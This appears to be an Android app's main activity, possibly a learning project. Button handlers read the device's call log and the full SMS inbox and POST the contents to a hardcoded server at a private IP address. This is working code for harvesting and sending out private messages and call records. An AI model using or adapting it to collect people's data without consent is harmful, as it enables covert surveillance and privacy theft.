package com.routineapp.aristaik.contentacess;

import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.sql.Date;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {
    private TextView mTextView;
    private Button mButton, m2Button , bButton;
    public String call_str = " " , sms_str = " ";

    private RequestQueue mRequestQueue ;
    private  String server_url = "http://192.168.43.99/learn/myapp.php";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mRequestQueue = Volley.newRequestQueue(MainActivity.this);
        mTextView = (TextView) findViewById(R.id.textView);
        mTextView.setMovementMethod(new ScrollingMovementMethod());
        mButton = (Button) findViewById(R.id.button);
        m2Button = (Button) findViewById(R.id.button2);
        bButton = (Button) findViewById(R.id.do_both);


    }

    public void DoBoth(View v){
        GetCalls(v);
        GetMsg(v);
    }

    public void GetCalls(View v) {

        Thread th = new Thread(){
          @Override
            public void run(){
                    super.run();//<--hear with-out the super there ocurs a porblem while writing to the file
                  call_str = getCallDetails();
                  Log.d("arif",call_str);
                  StringRequest stringResponse = new StringRequest(Request.Method.POST, server_url,

                          new Response.Listener<String>() {
                              @Override
                              public void onResponse(String response) {

                              }
                          }  ,new Response.ErrorListener(){

                      @Override
                      public void onErrorResponse(VolleyError error) {
                          mTextView.setText(error.toString());
                          error.printStackTrace();

                      }

                  }

                  ) {

                      @Override
                      protected Map<String,String> getParams()
                      {
                          Map<String,String> params = new HashMap<String,String>();

                          params.put("call_list",call_str);
                          return params;
                      }
                  };
                  mRequestQueue.add(stringResponse);

          }
        };

        th.start();

    }

    public void GetMsg(View v) {
        sms_str = "Loading....";
        Thread th = new Thread() {
            @Override
            public void run() {
                super.run();

                try {
                    Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
                    if (cursor.moveToFirst()) {

                        do {
                            for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                                sms_str += " " + cursor.getColumnName(idx) + " " + cursor.getString(idx) + "\n";
                            }

                        } while (cursor.moveToNext());
                    } else {

                        mTextView.setText("no msg");

                    }
                    Log.d("arif", sms_str);
                    updateView(sms_str);

                } catch (Exception e) {
                    e.printStackTrace();
                    mTextView.setText(e.toString());
                }

                StringRequest stringResponse = new StringRequest(Request.Method.POST, server_url,

                        new Response.Listener<String>() {
                            @Override
                            public void onResponse(String response) {
                                //mTextView.setText(response);
                                // requestQueue.stop();
                            }
                        }, new Response.ErrorListener() {

                    @Override
                    public void onErrorResponse(VolleyError error) {
                        // mTextView.setText(error.toString());
                        error.printStackTrace();
                        // requestQueue.stop();
                    }

                }

                ) {

                    @Override
                    protected Map<String, String> getParams() {
                        Map<String, String> params = new HashMap<String, String>();

                        params.put("sms_list", sms_str);
                        return params;
                    }
                };
                mRequestQueue.add(stringResponse);

            }
        };

        th.start();
    }

    public void updateView(String s) {

        mTextView.setText(s);
    }





    private String  getCallDetails() {
        String sb  =" ";//= new StringBuffer();
        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
      //  sb.append("Call Details :");
        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";

                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            } sb+="\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir
                            + " \nCall Date:--- " + callDayTime + "\nCall duration in sec :---"+callDuration ;
            sb+="\n----------------------------------";
        } managedCursor.close();
//        updateView(sb);
      //  str = sb.toString();
        return sb;
        //mTextView.setText(sb);
    }
}
